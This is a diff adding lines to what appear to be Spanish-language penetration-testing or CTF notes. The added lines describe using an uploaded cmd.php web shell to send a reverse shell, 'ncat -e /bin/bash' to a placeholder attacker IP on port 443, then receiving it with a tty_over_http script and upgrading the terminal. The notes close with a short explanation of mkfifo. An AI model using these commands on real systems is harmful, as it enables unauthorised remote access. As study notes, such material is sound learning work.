@@ -2025,5 +2025,14 @@ nc -nlvp 443 # No deberia estar entablando la conexión
 wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/refs/heads/master/tty_over_http.py
 # Editamos el archivo para cambiar index.html -> cmd.php el cual es el nombre del script que logramos colar en el servidor
 nano tty_over_http.py
-
+# Modificamos el cmd.php del servidor quitando solamente las etiquetas preformateadas <pre>
+# Intentamos nuevamente enviarnos una bash, esta vez usamos el script de python para recibir
+localhost/cmd.php?cmd=ncat -e /bin/bash ipAtacante 443
+python3 tty_over_http.py
+# Esperamos y ganamos acceso
+tty # Validamos que no sea una tty
+script /dev/null -c bash # para obtener una bash
+tty # Validamos que ya tengamos la consola
 ```
+
+mkfifo es un comando en sistemas tipo Unix (Linux, MacOs) utilizado para crear tuberías con nombre (named pipes), conocidas como archivos especiales FIFO (First In, First Out). Permite que procesos independientes se comuniquen entre sí enviando datos de un proceso a otro a través de un archivo en el disco que actúa como búfer en memoria.
